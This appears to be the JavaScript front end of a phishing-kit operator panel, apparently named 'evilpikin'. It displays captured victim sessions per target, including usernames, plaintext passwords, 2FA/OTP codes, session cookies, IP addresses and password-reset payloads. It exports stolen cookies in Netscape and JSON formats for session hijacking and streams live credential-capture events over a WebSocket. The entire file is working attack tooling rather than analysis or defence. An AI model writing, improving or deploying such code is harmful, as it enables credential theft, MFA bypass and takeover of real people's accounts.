(function () {
  "use strict";
  var eventsEl = document.getElementById("events");
  var rowsEl = document.getElementById("rows");
  var dot = document.getElementById("dot");
  var conn = document.getElementById("conn");
  var q = document.getElementById("q");
  var sidq = document.getElementById("sidq");
  var targetsel = document.getElementById("targetsel");
  var detail = document.getElementById("detail");
  var currentTarget = new URLSearchParams(location.search).get("target") || "";

  function fmtTime(t) {
    if (!t) return "";
    var d = new Date(t);
    if (isNaN(d)) return t;
    return d.toLocaleTimeString();
  }

  function esc(s) {
    return String(s == null ? "" : s).replace(/[&<>]/g, function (c) {
      return { "&": "&amp;", "<": "&lt;", ">": "&gt;" }[c];
    });
  }

  function addEvent(ev) {
    var wrap = document.createElement("div");
    wrap.className = "ev " + (ev.type || "");
    var head = "[" + fmtTime(ev.time) + "] " + (ev.type || "event");
    if (ev.target_id) head += " :: " + ev.target_id;
    wrap.textContent = head;
    if (ev.data) {
      var extra = [];
      for (var k in ev.data) {
        if (!ev.data.hasOwnProperty(k)) continue;
        extra.push(esc(k) + " = " + esc(ev.data[k]));
      }
      if (extra.length) {
        var line = document.createElement("div");
        line.textContent = extra.join("   ");
        wrap.appendChild(line);
      }
    }
    eventsEl.insertBefore(wrap, eventsEl.firstChild);
    while (eventsEl.childNodes.length > 200) eventsEl.removeChild(eventsEl.lastChild);
  }

  function renderSessions(data) {
    var list = (data && data.sessions) || [];
    var filter = (q.value || "").toLowerCase();
    rowsEl.innerHTML = "";
    if (!list.length) {
      rowsEl.innerHTML = "<tr><td colspan='7' style='opacity:.6'>no sessions captured yet</td></tr>";
      return;
    }
    list.forEach(function (s) {
      if (filter) {
        var hay = ((s.username || "") + " " + (s.target_id || "") + " " + (s.remote_addr || "") + " " + (s.target_name || "")).toLowerCase();
        if (hay.indexOf(filter) === -1) return;
      }
      var tr = document.createElement("tr");
      var cookieNames = Object.keys(s.cookies || {});
      var flow = s.flow_type || "standard";
      tr.innerHTML =
        "<td>" + esc(s.target_name || s.target_id) + "</td>" +
        "<td>" + esc(s.username) + "</td>" +
        "<td><span class='tag " + (flow === "reset" ? "reset" : "standard") + "'>" + esc(flow) + "</span></td>" +
        "<td>" + (cookieNames.length ? "<span class='tag'>" + cookieNames.length + "</span> " + esc(cookieNames.join(",")) : "—") + "</td>" +
        "<td>" + esc(s.remote_addr) + "</td>" +
        "<td class='" + (s.is_valid ? "valid" : "") + "'>" + (s.is_valid ? "yes" : "no") + "</td>" +
        "<td><button class='rowbtn' data-id='" + esc(s.id) + "'>Details</button> " +
        "<button class='rowbtn export' data-id='" + esc(s.id) + "'>Netscape</button> " +
        "<button class='rowbtn exportjson' data-id='" + esc(s.id) + "'>JSON</button></td>";
      rowsEl.appendChild(tr);
    });
    rowsEl.querySelectorAll("button[data-id]").forEach(function (b) {
      b.onclick = function () {
        var id = b.getAttribute("data-id");
        if (b.classList.contains("export")) exportCookies(id);
        else if (b.classList.contains("exportjson")) window.__exportJSON(id);
        else openSession(id);
      };
    });
  }

  function openSession(id) {
    fetch("/api/sessions/" + encodeURIComponent(id)).then(function (r) { return r.json(); }).then(showDetail).catch(function () {
      detail.className = "detail"; detail.innerHTML = "<i>failed to load session</i>";
    });
  }

  function showDetail(s) {
    if (!s || s.error) { detail.className = "detail"; detail.innerHTML = "<i>" + esc(s && s.error || "not found") + "</i>"; return; }
    var cookieNames = Object.keys(s.cookies || {});
    var cookiesHtml = cookieNames.length
      ? cookieNames.map(function (n) {
          var cs = s.cookies[n];
          var last = cs[cs.length - 1];
          return "<div><code>" + esc(n) + "</code> = <code>" + esc(last.value) + "</code> " +
            (last.http_only ? "<span class='tag'>httponly</span>" : "") + (last.secure ? "<span class='tag'>secure</span>" : "") + "</div>";
        }).join("")
      : "<i>none</i>";
    var customHtml = "";
    var custom = s.custom || {};
    var customKeys = Object.keys(custom);
    if (customKeys.length) {
      customHtml = "<div class='kv'>" + customKeys.map(function (k) {
        return "<b>" + esc(k) + "</b><span><code>" + esc(custom[k]) + "</code></span>";
      }).join("") + "</div>";
    }
    var logHtml = (s.telemetry_log && s.telemetry_log.length)
      ? s.telemetry_log.map(function (l) { return esc(l); }).join("\n")
      : "<i>no telemetry logged</i>";
    detail.className = "detail";
    detail.innerHTML =
      "<h3>Session " + esc(s.id) + " &nbsp;<button class='rowbtn export' onclick=\"window.__export('" + esc(s.id) + "')\">Export Netscape</button> <button class='rowbtn export' onclick=\"window.__exportJSON('" + esc(s.id) + "')\">Export JSON</button></h3>" +
      "<div class='kv'>" +
        "<b>Target</b><span>" + esc(s.target_name || s.target_id) + "</span>" +
        "<b>Username</b><span><code>" + esc(s.username) + "</code></span>" +
        "<b>Password</b><span><code>" + esc(s.password) + "</code></span>" +
        "<b>2FA / OTP</b><span><code>" + esc(s.otp_token) + "</code></span>" +
        "<b>Flow</b><span><span class='tag " + (s.flow_type === "reset" ? "reset" : "standard") + "'>" + esc(s.flow_type || "standard") + "</span></span>" +
        "<b>Remote</b><span>" + esc(s.remote_addr) + "</span>" +
        "<b>User-Agent</b><span>" + esc(s.user_agent) + "</span>" +
        "<b>Status</b><span class='" + (s.is_valid ? "valid" : "") + "'>" + esc(s.status) + (s.is_valid ? " (authorized)" : "") + "</span>" +
        "<b>Created</b><span>" + esc(fmtTime(s.created_at)) + "</span>" +
      "</div>" +
      (customHtml ? "<div style='margin-top:8px'><b style='color:var(--accent)'>Reset payload</b>" + customHtml + "</div>" : "") +
      "<div style='margin-top:8px'><b style='color:var(--accent)'>Cookies (" + cookieNames.length + ")</b>" + cookiesHtml + "</div>" +
      "<div style='margin-top:8px'><b style='color:var(--accent)'>Telemetry log</b><div class='log'>" + logHtml + "</div></div>";
  }

  function exportCookies(id) {
    window.__export(id);
  }
  window.__export = function (id) {
    var a = document.createElement("a");
    a.href = "/api/sessions/" + encodeURIComponent(id) + "/export";
    a.download = "evilpikin_" + id + ".cookies.txt";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  };
  window.__exportJSON = function (id) {
    var a = document.createElement("a");
    a.href = "/api/sessions/" + encodeURIComponent(id) + "/export.json";
    a.download = "evilpikin_" + id + ".cookies.json";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  };
  function exportTargetJSON() {
    if (!targetsel.value) { alert("Select a target from the dropdown to export its cookies."); return; }
    var a = document.createElement("a");
    a.href = "/api/targets/" + encodeURIComponent(targetsel.value) + "/export.json";
    a.download = "evilpikin_target_" + targetsel.value + ".cookies.json";
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
  }

  function loadTargets() {
    fetch("/api/targets").then(function (r) { return r.json(); }).then(function (d) {
      var list = (d && d.targets) || [];
      list.forEach(function (t) {
        var o = document.createElement("option");
        o.value = t.id;
        o.textContent = t.name || t.id;
        targetsel.appendChild(o);
      });
      if (currentTarget) targetsel.value = currentTarget;
    }).catch(function () {});
  }

  function refresh() {
    var qs = "";
    if (targetsel.value) qs = "?target_id=" + encodeURIComponent(targetsel.value);
    fetch("/api/sessions" + qs).then(function (r) { return r.json(); }).then(renderSessions).catch(function () {});
  }

  var proto = location.protocol === "https:" ? "wss://" : "ws://";
  var ws;
  var wsToken = 0;
  // Open (or re-open) the live telemetry socket scoped to the currently selected
  // target. The server filters by ?target= so we only receive this target's
  // stream; an empty selection subscribes to every event ("All targets").
  function connectWS() {
    if (ws) { try { ws.close(); } catch (e) {} }
    var my = ++wsToken;
    var t = targetsel.value || currentTarget || "";
    var url = proto + location.host + "/ws" + (t ? "?target=" + encodeURIComponent(t) : "");
    ws = new WebSocket(url);
    ws.onopen = function () {
      dot.className = "dot live";
      conn.textContent = "connected" + (t ? " :: " + t : "");
    };
    ws.onclose = function () {
      if (my !== wsToken) return; // a newer connection superseded this one
      dot.className = "dot";
      conn.textContent = "disconnected — retrying";
      setTimeout(connectWS, 2000);
    };
    ws.onmessage = function (e) {
      try {
        var ev = JSON.parse(e.data);
        addEvent(ev);
        if (ev.type === "credential" || ev.type === "cookie" || ev.type === "session") refresh();
      } catch (err) {}
    };
  }
  connectWS();

  document.getElementById("refresh").onclick = refresh;
  q.oninput = refresh;
  targetsel.onchange = function () { refresh(); connectWS(); };
  document.getElementById("exporttarget").onclick = exportTargetJSON;
  document.getElementById("lookup").onclick = function () {
    var id = (sidq.value || "").trim();
    if (id) openSession(id);
  };
  sidq.onkeydown = function (e) { if (e.key === "Enter") document.getElementById("lookup").onclick(); };
  loadTargets();
  refresh();
})();
